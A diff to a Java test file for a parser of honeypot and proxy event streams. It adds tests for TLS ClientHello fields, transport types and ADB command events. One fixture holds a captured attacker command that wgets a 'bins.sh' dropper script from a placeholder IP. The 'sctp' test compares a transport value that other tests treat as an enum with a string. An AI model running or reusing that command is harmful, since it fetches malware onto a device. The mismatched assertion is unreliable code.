@@ -12,7 +12,9 @@ import com.synthient.model.HeliosAdbEvent;
 import com.synthient.model.HeliosDnsEvent;
 import com.synthient.model.HeliosHttpEvent;
 import com.synthient.model.HeliosHttpsEvent;
+import com.synthient.model.HeliosTransport;
 import com.synthient.model.ProxyEvent;
+import com.synthient.model.TlsClientHello;
 import com.synthient.model.TorrentEvent;
 import java.io.ByteArrayInputStream;
 import java.io.IOException;
@@ -132,26 +134,109 @@ class EventStreamTest {
         HeliosHttpsEvent https = readAll(
                         chunked(
                                 "{\"timestamp\":1780000000123,\"tunnel_id\":17257744507466107949,\"domain\":\"a.test\",\"port\":443,"
-                                        + "\"protocol\":\"https\"," + meta + ",\"details\":null,\"raw\":null}\n",
+                                        + "\"protocol\":\"https\"," + meta + ",\"details\":null,\"raw\":null,"
+                                        + "\"transport\":\"tcp\"}\n",
                                 64),
                         HeliosHttpsEvent.class)
                 .getFirst();
         assertEquals(new BigInteger("17257744507466107949"), https.tunnelId());
         assertNull(https.details());
+        assertEquals(HeliosTransport.TCP, https.transport());
 
         HeliosDnsEvent dns = readAll(
                         chunked(
                                 "{\"timestamp\":1780000000123,\"tunnel_id\":18446744073709551615,\"domain\":\"a.test\",\"port\":53,"
-                                        + "\"protocol\":\"dns\"," + meta + "}\n",
+                                        + "\"protocol\":\"dns\"," + meta + ",\"transport\":\"udp\"}\n",
                                 64),
                         HeliosDnsEvent.class)
                 .getFirst();
         assertEquals(new BigInteger("18446744073709551615"), dns.tunnelId());
         assertEquals("198.51.100.4", dns.meta().proxyIp());
+        assertEquals(HeliosTransport.UDP, dns.transport());
 
         assertThrows(
                 SynthientException.class,
                 () -> readAll(chunked("{\"session\":\"s\",\"command\":\"ls\"}\n", 64), HeliosAdbEvent.class));
+    }
+
+    private static final String HTTPS_EVENT = """
+            {"timestamp": 1714780800123, "tunnel_id": 17257744507466107949, "domain": "example.com", "port": 443,
+             "protocol": "https", "meta": {"proxy_ip": "203.0.113.10", "server": "hp-eu-1", "pool_id": "prod",
+             "provider": "luminati"}, "transport": "%s", "details": %s}
+            """;
+
+    @Test
+    void decodesEveryClientHelloField() {
+        String details = """
+                {"record_version": "TLS 1.0", "record_version_code": 769, "handshake_version": "TLS 1.2",
+                 "handshake_version_code": 771, "supported_version_codes": [2570, 772, 771],
+                 "alpn_hex": ["6832", "687474702f312e31"],
+                 "signature_algorithms_cert": [{"code": 2052, "name": "rsa_pss_rsae_sha256"}],
+                 "record_size_limit": 16385, "max_fragment_length": 2, "complete": false, "truncated": true,
+                 "transport": "tcp"}
+                """;
+        HeliosHttpsEvent event =
+                Json.decode(HTTPS_EVENT.formatted("tcp", details).getBytes(UTF_8), HeliosHttpsEvent.class);
+        TlsClientHello hello = event.details();
+        assertNotNull(hello);
+        assertEquals(769, hello.recordVersionCode());
+        assertEquals(771, hello.handshakeVersionCode());
+        assertEquals(List.of(0x0a0a, 772, 771), hello.supportedVersionCodes());
+        assertEquals(List.of("6832", "687474702f312e31"), hello.alpnHex());
+        assertNotNull(hello.signatureAlgorithmsCert());
+        assertEquals(
+                "rsa_pss_rsae_sha256",
+                hello.signatureAlgorithmsCert().getFirst().name());
+        assertEquals(16385, hello.recordSizeLimit());
+        assertEquals(2, hello.maxFragmentLength());
+        assertEquals(false, hello.complete());
+        assertEquals(true, hello.truncated());
+        assertEquals(HeliosTransport.TCP, hello.transport());
+
+        TlsClientHello empty = Json.decode(HTTPS_EVENT.formatted("tcp", "{}").getBytes(UTF_8), HeliosHttpsEvent.class)
+                .details();
+        assertNotNull(empty);
+        assertNull(empty.complete());
+        assertNull(empty.truncated());
+        assertNull(empty.transport());
+        assertNull(empty.recordVersionCode());
+        assertNull(empty.handshakeVersionCode());
+        assertNull(empty.supportedVersionCodes());
+        assertNull(empty.alpnHex());
+        assertNull(empty.signatureAlgorithmsCert());
+        assertNull(empty.recordSizeLimit());
+        assertNull(empty.maxFragmentLength());
+    }
+
+    @Test
+    void keepsUnknownTransports() {
+        HeliosHttpsEvent https =
+                Json.decode(HTTPS_EVENT.formatted("sctp", "null").getBytes(UTF_8), HeliosHttpsEvent.class);
+        assertEquals("sctp", https.transport());
+        String withoutTransport = HTTPS_EVENT.formatted("tcp", "null").replace("\"transport\": \"tcp\", ", "");
+        assertThrows(
+                SynthientException.class, () -> Json.decode(withoutTransport.getBytes(UTF_8), HeliosHttpsEvent.class));
+        assertThrows(
+                SynthientException.class, () -> Json.decode(withoutTransport.getBytes(UTF_8), HeliosDnsEvent.class));
+    }
+
+    @Test
+    void decodesAdbEventsWithAndWithoutMeta() {
+        String event = """
+                {"session": "00075b3dde7ddb645347a137f01ac991", "sequential_id": 3,
+                 "command": "cd /data/local/tmp; wget http://198.51.100.7/bins.sh", "hash": "cd6d", "meta": %s}
+                """;
+        HeliosAdbEvent withMeta = Json.decode(
+                event.formatted("{\"proxy_ip\": \"203.0.113.10\", \"server\": \"hp-eu-1\", \"pool_id\": \"prod\","
+                                + " \"provider\": \"luminati\"}")
+                        .getBytes(UTF_8),
+                HeliosAdbEvent.class);
+        assertNotNull(withMeta.meta());
+        assertEquals("luminati", withMeta.meta().provider());
+        assertEquals(3, withMeta.sequentialId());
+
+        HeliosAdbEvent withoutMeta = Json.decode(event.formatted("null").getBytes(UTF_8), HeliosAdbEvent.class);
+        assertNull(withoutMeta.meta());
     }
 
     @Test
